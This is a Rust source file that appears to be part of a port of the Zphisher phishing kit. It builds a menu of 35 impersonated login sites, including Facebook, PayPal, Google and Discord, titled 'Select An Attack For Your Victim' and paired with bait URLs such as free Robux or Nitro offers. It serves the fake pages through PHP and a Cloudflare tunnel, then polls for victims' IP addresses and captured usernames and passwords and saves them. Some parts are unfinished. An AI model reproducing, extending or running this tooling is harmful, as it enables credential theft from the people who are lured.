use crate::behind::cli::{clear_terminal, error_msg, log_msg};
use crate::behind::constants::*;
use crate::behind::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};

use colored::Colorize;
use std::{env, io, thread, time};

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{exit, Command};

use reqwest::Url;
use std::fs::{File, OpenOptions, remove_file};
use std::io::{BufRead, BufReader, Write};
use std::thread::sleep;
use std::time::Duration;
use zip::read::ZipFile;
use zip::ZipArchive;
use rayon::prelude::*;
use regex::Regex;
use crate::behind::errors::TerminalError;


pub fn setup_directories() {
    let base_dir = match get_data_dir() {
        Some(e) => e.join("zphisher"),
        None => {
            log::error!("{}", "Failed to get home directory".red());
            error_msg("Failed to get home directory");
            exit(1);
        }
    };

    create_dir_if_not_exists(&base_dir.join(".server"));
    create_dir_if_not_exists(&base_dir.join("auth"));
    create_dir_if_not_exists(&base_dir.join(".server/www"));
    remove_file_if_exists(&base_dir.join(".server/.loclx"));
    remove_file_if_exists(&base_dir.join(".server/.cld.log"));
}

fn handle_error<T, E: std::fmt::Display>(result: Result<T, E>, error_msg_: &str) {
    match result {
        Ok(_) => {}
        Err(e) => {
            log::error!("{}", e);
            error_msg(&format!("{}: {}", error_msg_, e));
            exit(1);
        }
    }
}

fn create_dir_if_not_exists(dir: &Path) {
    if !dir.exists() {
        handle_error(fs::create_dir_all(dir), "Failed to create directory");
    }
}

/*
fn recreate_dir(dir: &Path) {
    if dir.exists() {
        handle_error(fs::remove_dir_all(dir), "Failed to remove directory");
    }
    handle_error(fs::create_dir_all(dir), "Failed to create directory");
}
*/

fn remove_file_if_exists(file: &Path) {
    if file.exists() {
        handle_error(remove_file(file), "Failed to remove file");
    }
}

pub fn banner() {
    const BANNER: &str = r#"
     ______      _     _     _
    |___  /     | |   (_)   | |
       / / _ __ | |__  _ ___| |__   ___ _ __
      / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
     / /__| |_) | | | | \__ \ | | |  __/ |
    /_____| .__/|_| |_|_|___/_| |_|\___|_|
          | |
          |_|
"#;
    println!("{}", BANNER.bright_red());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
    println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
}

pub fn banner_small() {
    const BANNER: &str = r#"
░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
"#;
    println!("{}", BANNER.cyan());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
}

#[cfg(target_os = "windows")]
pub fn kill_pid() {
    log::info!("Killing processes");
    use sysinfo::{ProcessExt, System, SystemExt};
    let processes_to_kill = vec![
        "php.exe",
        "cloudflared-windows-amd64.exe",
        "loclx.exe",
        "cloudflared-windows-386.exe",
    ];
    let mut sys = System::new_all();

    // We refresh the list of processes.
    sys.refresh_processes();

    for (pid, proc) in sys.processes() {
        if processes_to_kill.contains(&proc.name()) {
            // Kill the process by PID
            if let Err(e) = Command::new("taskkill").arg("/PID").arg(pid.to_string()).arg("/F").output() {
                log::error!("Failed to kill process {}: {}", pid, e);
                error_msg(&format!("Failed to kill process {}: {}", pid, e));
            }
        }
    }
}

#[cfg(target_os = "linux")]
pub fn kill_pid() {
    let processes_to_kill = vec!["php", "cloudflared", "loclx"];
    let procs = match procfs::process::all_processes() {
        Ok(p) => p,
        Err(e) => {
            error_msg(&format!("Failed to get processes: {}", e));
            return;
        }
    };

    for proc in procs {
        if let Ok(cmd) = {
            match proc {
                Ok(ref a) => a,
                Err(e) => {
                    log::error!("Failed to get process: {}", e);
                    error_msg(&format!("Failed to get process: {}", e));
                    continue;
                }
            }
        }.cmdline() {
            if let Some(process_name) = cmd.get(0) {
                if processes_to_kill.contains(&process_name.as_str()) {
                    if let Err(e) = nix::sys::signal::kill(
                        nix::unistd::Pid::from_raw({
                            match proc {
                                Ok(v) => v,
                                Err(e) => {
                                    log::error!("Failed to get process: {}", e);
                                    error_msg(&format!("Failed to get process: {}", e));
                                    continue;
                                }
                            }.pid
                        } as i32),
                        nix::sys::signal::Signal::SIGKILL,
                    ) {
                        log::error!("Failed to kill process: {}", e);
                        error_msg(&format!("Failed to kill process: {}", e));
                    }
                }
            }
        }
    }
}


fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let file_name: &str = url.split('/').last().unwrap_or("tmp.bin");
    let file_extension: &str = file_name.split('.').last().unwrap_or("");

    log::info!("Downloading {} to {}", url, file_name);

    let target_path = match get_server_dir() {
        Some(path) => path.join(file_name),
        None => Path::new(file_name).to_path_buf(),
    };

    log::info!("Target path (Raw installation): {:?}", target_path);

    // Download the file
    let client = reqwest::blocking::Client::new();
    let mut response = client.get(Url::parse(url)?).header("User-Agent", USER_AGENT).send()?;
    let mut file = File::create(&target_path)?;
    //file.write_all(response.bytes()?.as_ref())?;

    response.copy_to(&mut file)?;

    log::info!("File extension: {}", file_extension);
    log::info!("File name: {}", file_name);
    log::info!("Target path: {:?}", target_path);

    // Handle different file types
    // TODO: REMEMBER HERE *
    let mut outpath = PathBuf::new();

    match file_extension {
        "exe" => {
            outpath = target_path;
        }
        "zip" => {
            let mut archive: ZipArchive<File> = ZipArchive::new(File::open(&target_path)?)?;
            for i in 0..archive.len() {
                let mut file: ZipFile = archive.by_index(i)?;

                outpath = match get_server_dir() {
                    Some(path) => path.join({
                        match file.enclosed_name() {
                            Some(path) => path.to_owned(),
                            None => continue,
                        }
                    }),
                    None => continue,
                };

                let mut outfile = OpenOptions::new().create_new(true).write(true).append(true).open(&outpath)?;

                std::io::copy(&mut file, &mut outfile)?;
            }
            remove_file(target_path)?;
        }
        #[cfg(target_os = "linux")]
        "tgz" => {
            let tar_gz = File::open(file_name)?;
            let tar = flate2::read::GzDecoder::new(tar_gz);
            let mut archive = tar::Archive::new(tar);
            archive.unpack(&target_path)?;
        }
        #[cfg(target_os = "windows")]
        _ => {
            log::error!("Unknown file type: {}", file_extension);
            error_msg(&format!("Unknown file type: {}", file_extension));
            return Err("Unknown file type".into());
        }

        #[cfg(not(target_os = "windows"))]
        _ => {}
    }
    log::info!("Outpath: {:?}", outpath);
    Ok(outpath)
}

pub fn install_dependencies() {
    log::info!("Checking dependencies");
    log_msg("Checking for dependencies... (installing them, if they don't exist)");

    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path: {}", e);
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = get_server_dir().unwrap_or(
        {
            match exe_path.parent() {
                Some(p) => p.to_path_buf(),
                None => {
                    log::error!("Failed to get current executable path");
                    error_msg("Failed to get current executable path");
                    return;
                }
            }
        }.join(BIN_PATH),
    );

    let download_links: Vec<&str> = get_download_urls();
    if files_exist(&bin_path) {
        return;
    }
    download_links.par_iter().for_each(|download_link| {
        /*
        #[cfg(not(target_os = "windows"))] let bin_path = match exe_path.parent() {
            Some(p) => p.join(get_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
            None => {
                log::error!("Failed to get current executable path");
                error_msg("Failed to get current executable path");
                return;
            }
        };*/

        log::info!("Bin Path (S281): {:?}", bin_path);

        if !bin_path.exists() {
            if let Err(e) = fs::create_dir(&bin_path) {
                log::error!("Failed to create 'bin' directory: {}", e);
                error_msg(&format!("Failed to create 'bin' directory: {}", e));
                return;
            }
        }

        match download(download_link) {
            Ok(p) => {
                log::info!("Downloaded {}", p.display());
                #[cfg(target_os = "windows")]
                if let Err(e) = Command::new("powershell").arg("-Command").arg("Start-Process").arg(&p).arg("-ArgumentList").arg("service").arg("install").arg("-Verb").arg("RunAs").output() {
                    log::error!("Failed to install {}: {e}", p.display());
                    error_msg(&format!("Failed to install {}: {e}", p.display()));
                }

                #[cfg(not(target_os = "windows"))]
                if let Err(e) = Command::new("chmod").arg("+x").arg(&p).output() {
                    log::error!("Failed to give execute permissions to {}: {e}", p.display());
                    error_msg(&format!(
                        "Failed to give execute permissions to {}: {e}",
                        p.display()
                    ));
                }
            }
            Err(e) => {
                log::error!("Failed to download(E310): {}", e);
                error_msg(&format!("Failed to download(E310): {}", e));
            }
        }
    });
}


pub fn custom_port_input() -> Result<u16, TerminalError> {
    loop {
        print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] : ".cyan(), String::new().white());
        io::stdout().flush()?;
        let mut selection = String::new();
        io::stdin().read_line(&mut selection)?;
        selection = selection.trim().to_string();
        if selection.is_empty() {
            log::error!("No input");
            error_msg("Empty input");
        }
        // turn this into a match statement
        let num: u16 = match selection.parse::<u16>() {
            Ok(s) => s,
            Err(_) => {
                log::error!("Not a number");
                error_msg("Not a number");
                continue;
            }
        };

        if !(1024..=9999).contains(&num) {
            log::error!("Not in range");
            error_msg("Not in range");
            continue;
        }
        return Ok(num);
    }
}

pub fn site_input() -> Result<u16, TerminalError> {
    loop {
        print!("{}{}", "Select a site: ".cyan(), String::new().white());
        io::stdout().flush()?;
        let mut selection = String::new();
        io::stdin().read_line(&mut selection)?;
        selection = selection.trim().to_string();
        if selection.is_empty() {
            log::error!("Empty input");
            error_msg("Empty input");
        } else {
            let num: u16 = match selection.parse::<u16>() {
                Ok(s) => s,
                Err(_) => {
                    log::error!("Not a number or out of range");
                    error_msg("Not a number or out of range");
                    continue;
                }
            };
            return Ok(num);
        }
    }
}


// TODO: site_selection stops the entire program because of async recursion, so fix that.
pub fn site_selection<'a>() -> Result<(&'a str, Option<&'a str>), TerminalError> {
    let selection = match site_input() {
        Ok(s) => s,
        Err(e) => {
            log::error!("Failed to get site input: {}", e);
            error_msg(&format!("Failed to get site input: {}", e));
            return Err("Failed to get site input".into());
        }
    };
    match selection {
        1 => Ok(("facebook", None)),
        2 => Ok(("instagram", None)),
        3 => Ok(("google", None)),
        4 => Ok(("microsoft", Some("https://unlimited-onedrive-space-for-free"))),
        5 => Ok(("netflix", Some("https://upgrade-your-netflix-plan-free"))),
        6 => Ok(("paypal", Some("https://get-500-usd-free-to-your-acount"))),
        7 => Ok(("steam", Some("https://steam-500-usd-gift-card-free"))),
        8 => Ok(("twitter", Some("https://get-blue-badge-on-twitter-free"))),
        9 => Ok(("playstation", Some("https://playstation-500-usd-gift-card-free"))),
        10 => Ok(("tiktok", Some("https://tiktok-free-liker"))),
        11 => Ok(("twitch", Some("https://unlimited-twitch-tv-user-for-free"))),
        12 => Ok(("pinterest", Some("https://get-a-premium-plan-for-pinterest-free"))),
        13 => Ok(("snapchat", Some("https://view-locked-snapchat-accounts-secretly"))),
        14 => Ok(("linkedin", Some("https://get-a-premium-plan-for-linkedin-free"))),
        15 => Ok(("ebay", Some("https://get-500-usd-free-to-your-acount"))),
        16 => Ok(("quora", Some("https://quora-premium-for-free"))),
        17 => Ok(("protonmail", Some("https://protonmail-pro-basics-for-free"))),
        18 => Ok(("spotify", Some("https://convert-your-account-to-spotify-premium"))),
        19 => Ok(("reddit", Some("https://reddit-official-verified-member-badge"))),
        20 => Ok(("adobe", Some("https://get-adobe-lifetime-pro-membership-free"))),
        21 => Ok(("deviantart", Some("https://get-500-usd-free-to-your-acount"))),
        22 => Ok(("badoo", Some("https://get-500-usd-free-to-your-acount"))),
        23 => Ok(("origin", Some("https://get-500-usd-free-to-your-acount"))),
        24 => Ok(("dropbox", Some("https://get-1TB-cloud-storage-free"))),
        25 => Ok(("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free"))),
        26 => Ok(("wordpress", Some("https://unlimited-wordpress-traffic-free"))),
        27 => Ok(("yandex", Some("https://grab-mail-from-anyother-yandex-account-free"))),
        28 => Ok(("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free"))),
        29 => Ok(("vk", None)),
        30 => Ok(("xbox", Some("https://get-500-usd-free-to-your-acount"))),
        31 => Ok(("mediafire", Some("https://get-1TB-on-mediafire-free"))),
        32 => Ok(("gitlab", Some("https://get-1k-followers-on-gitlab-free"))),
        33 => Ok(("github", Some("https://get-1k-followers-on-github-free"))),
        34 => Ok(("discord", Some("https://get-discord-nitro-free"))),
        35 => Ok(("roblox", Some("https://get-free-robux"))),
        99 => Ok(("about", None)),
        0 => Ok(("exit", None)),
        // TODO: Here fix the Error ( This causes the program to stop )
        _ => {
            log::error!("Invalid selection");
            error_msg("Invalid selection, Please try again");
            Err("Invalid selection".into())
        }
    }
}


pub fn start_localhost() -> Result<(), TerminalError> {
    let custom_port: u16 = custom_port_input()?;
    log::info!("Starting localhost on port {}", custom_port);
    println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
    setup_site()?;
    clear_terminal()?;
    banner_small();
    println!("{} ({})", "Successfully Hosted at : ".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
    capture_data()?;
    // TODO: to be implemented
    Ok(())
}

pub fn tunnel_menu() -> Result<(), TerminalError> {
    clear_terminal()?;
    banner_small();
    let servers = vec![
        ("01", "Localhost", None),
        ("02", "Cloudflared", Some("Auto Detects")),
        ("03", "LocalXpose", Some("NEW! Max 15Min")),
    ];

    for (id, server, note) in servers {
        let colorized_id = format!("[{}]", id).red();
        let colorized_server = server.truecolor(255, 165, 0);
        match note {
            Some(note) => println!("{} {} [{}]", colorized_id, colorized_server, note.cyan()),
            None => println!("{} {}", colorized_id, colorized_server),
        }
    }

    Ok(())
}


pub fn setup_site() -> Result<(), TerminalError> {
    log::info!("Setting up site");
    #[cfg(target_os = "windows")]
    {
        println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
        let php_path = env::current_dir()?.join("php-bin").join("php.exe");
        if !php_path.exists() {
            log::error!("PHP not found");
            error_msg("PHP not found");
            return Err("PHP not found".into());
        }
        // change into .server directory
        let sites_dir = get_sites_dir().unwrap_or_else(|| {
            log::error!("Failed to get sites directory");
            error_msg("Failed to get sites directory");
            exit(1);
        });
        env::set_current_dir(sites_dir)?;

        // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
        let mut cmd = Command::new(php_path);
        cmd.arg("-S");
        cmd.arg(format!("{}:{}", HOST, PORT));
        clear_terminal()?;
        banner_small();
        println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
    }
    #[cfg(not(target_os = "windows"))]
    {
        println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
        // change into .server directory
        let sites_dir = get_sites_dir().unwrap_or_else(|| {
            log::error!("Failed to get sites directory");
            error_msg("Failed to get sites directory");
            exit(1);
        });
        env::set_current_dir(sites_dir)?;

        // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
        let mut cmd = Command::new("php");
        cmd.arg("-S");
        cmd.arg(format!("{}:{}", HOST, PORT));
        clear_terminal()?;
        banner_small();
        println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
    }
    Ok(())
}

fn capture_ip() -> Result<(), TerminalError> {
    let ip_file_path = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            exit(1);
        }
    }.join("www").join("ip.txt");
    let mut ip_file = BufReader::new(File::open(ip_file_path)?);
    let mut ip = String::new();
    match ip_file.read_line(&mut ip) {
        Ok(_) => {}
        Err(e) => {
            log::error!("Failed to read IP file: {}", e);
            error_msg(&format!("Failed to read IP file: {}", e));
            exit(1);
        }
    };

    // Extract the IP part
    if let Some(start) = ip.find("IP: ") {
        ip = ip[start + 4..].trim().to_string();
    } else {
        return Err("IP not found".into());
    }

    println!("Victim's IP : {}", ip.green());
    println!("Saved in : auth/ip.txt");

    let mut auth_file = OpenOptions::new().append(true).open("auth/ip.txt")?;
    writeln!(auth_file, "{}", ip)?;

    Ok(())
}

fn capture_creds() -> Result<(), TerminalError> {
    let usernames_file_path = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            exit(1);
        }
    }.join("www").join("usernames.txt");

    let file = BufReader::new(File::open(&usernames_file_path)?);

    let mut account = String::new();
    let mut password = String::new();

    let account_regex = Regex::new(r"Username:\s*(\S*)").unwrap();
    let password_regex = Regex::new(r"Pass:\s*(\S*)").unwrap();

    for line in file.lines() {
        let line = line?;
        if account.is_empty() {
            if let Some(captures) = account_regex.captures(&line) {
                account = captures[1].to_string();
            }
        }
        if password.is_empty() {
            if let Some(captures) = password_regex.captures(&line) {
                password = captures[1].to_string();
            }
        }
        if !account.is_empty() && !password.is_empty() {
            break;
        }
    }

    println!("Account : {}", account.green());
    println!("Password : {}", password.green());
    println!("Saved in : auth/usernames.dat");

    let mut auth_file = OpenOptions::new().append(true).open("auth/usernames.dat")?;
    let mut original_file = File::open(&usernames_file_path)?;
    io::copy(&mut original_file, &mut auth_file)?;

    println!("Waiting for Next Login Info, Ctrl + C to exit.");

    Ok(())
}

pub fn capture_data() -> Result<(), TerminalError> {
    println!("{} {}", "Waiting for Login Info, Ctrl + C to exit...".yellow(), "Please wait".cyan());
    let ip_txt = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            exit(1);
        }
    }.join("www").join("ip.txt");

    let username_txt = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            exit(1);
        }
    }.join("www").join("usernames.txt");
    loop {
        if ip_txt.exists() {
            println!("{} {}", "Victim IP Found !".green(), "Please wait".cyan());
            capture_ip()?;
        }
        sleep(Duration::from_millis(750));
        if username_txt.exists() {
            println!("{} {}", "Login info Found !!".green(), "Please wait".cyan());
            capture_creds()?;
        }
        sleep(Duration::from_millis(750));
    }
}


fn get_cldflr_url() -> Result<String, TerminalError> {
    let log_file_path = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            return Err("Failed to get server directory".into());
        }
    }.join(".cld.log");
    let file = BufReader::new(File::open(&log_file_path)?);
    let url_regex = match Regex::new(r"https://[-0-9a-z]*\.trycloudflare\.com") {
        Ok(r) => r,
        Err(e) => {
            log::error!("Failed to create regex: {}", e);
            error_msg(&format!("Failed to create regex: {}", e));
            return Err("Failed to create regex".into());
        }
    };
    for line in file.lines() {
        let line = line?;
        if let Some(captures) = url_regex.captures(&line) {
            return Ok(captures[0].to_string());
        }
    }

    Err("URL not found".into())
}


pub fn start_cloudflared() -> Result<(), TerminalError> {
    // remove ".cld.log" file if exists
    let cld_log = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            return Err("Failed to get server directory".into());
        }
    }.join(".cld.log");

    if cld_log.exists() {
        match remove_file(&cld_log) {
            Ok(_) => {}
            Err(e) => {
                log::error!("Failed to remove .cld.log file: {}", e);
                error_msg(&format!("Failed to remove .cld.log file: {}", e));
                return Err(e.into());
            }
        }
    }
    setup_site()?;
    let cus_port: u16 = custom_port_input()?;
    #[cfg(target_os = "windows")]
    {
        let mut cmd = Command::new("cmd");
        cmd.arg("/c").arg("cloudflared").arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port)).arg("--logfile").arg(".cld.log");
        cmd.spawn()?;
        sleep(Duration::from_secs(8));
        let url = get_cldflr_url()?;
        println!("{} {}", "Cloudflared URL:".green(), url.cyan());
    }
    #[cfg(not(target_os = "windows"))]
    {
        let cloudflare_file = match ARCH {
            "x86_64" => "cloudflared-linux-amd64",
            "aarch64" => "cloudflared-linux-arm64",
            _ => {
                log::error!("Unsupported architecture: {}", ARCH);
                error_msg(&format!("Unsupported architecture: {}", ARCH));
                return Err("Unsupported architecture".into());
            }
        };
        let mut cmd = Command::new(cloudflare_file);
        cmd.arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port)).arg("--logfile").arg(".cld.log");
    }
    Ok(())
}

pub fn main_menu() -> Result<(), TerminalError> {
    clear_terminal()?;
    banner();


    let services: Vec<(&str, (u8, u8, u8))> = vec![
        ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
        ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
        ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
        ("Snapchat", (255, 252, 0)), ("Linkedin", (0, 119, 181)), ("Ebay", (186, 23, 34)), ("Quora", (185, 43, 39)),
        ("Protonmail", (84, 172, 210)), ("Spotify", (29, 185, 84)), ("Reddit", (255, 87, 0)), ("Adobe", (237, 23, 43)),
        ("DeviantArt", (5, 150, 105)), ("Badoo", (230, 74, 25)), ("Origin", (244, 67, 54)), ("DropBox", (0, 126, 229)),
        ("Yahoo", (150, 0, 155)), ("Wordpress", (33, 117, 155)), ("Yandex", (213, 0, 0)), ("StackOverflow", (244, 67, 54)),
        ("Vk", (76, 118, 176)), ("XBOX", (16, 124, 16)), ("Mediafire", (49, 80, 195)), ("Gitlab", (233, 30, 99)),
        ("Github", (100, 100, 100)), ("Discord", (114, 137, 218)), ("Roblox", (226, 35, 26)),
    ];

    println!("{}", "[::] Select An Attack For Your Victim [::]".red());

    for (i, (service, color)) in services.iter().enumerate() {
        let id = format!("{:2}", i + 1);
        let colorized_service = service.truecolor(color.0, color.1, color.2);
        print!("{}) {:<15} ", id.red(), colorized_service);
        if (i + 1) % 3 == 0 {
            println!();
        }
    }

    // If the number of services is not a multiple of 3, we need to print a new line
    if services.len() % 3 != 0 {
        println!();
    }

    println!("{}) {:<15} ", "99".red(), "About".bright_blue());
    println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
    println!();
    let sel: (&str, Option<&str>) = match site_selection() {
        Ok(s) => s,
        Err(e) => {
            log::error!("Failed to get site selection: {}", e);
            error_msg(&format!("Failed to get site selection: {}", e));
            return Err("Failed to get site selection".into());
        }
    };
    // println!("signaled: {se}");
    Ok(())
}

// TODO: Add LocalXPose and Localhost.
// TODO: Add Start with Cloudflare.
// TODO: Add LocalXPose Auth.
// TODO: Add Start with LocalXPose.
// TODO: Add Start with Localhost.
// TODO: Add Tunnel Menu.
// TODO: Add URL shortener/masking.
// TODO: Add Menu.

// TODO: Add checks for file download!!!!
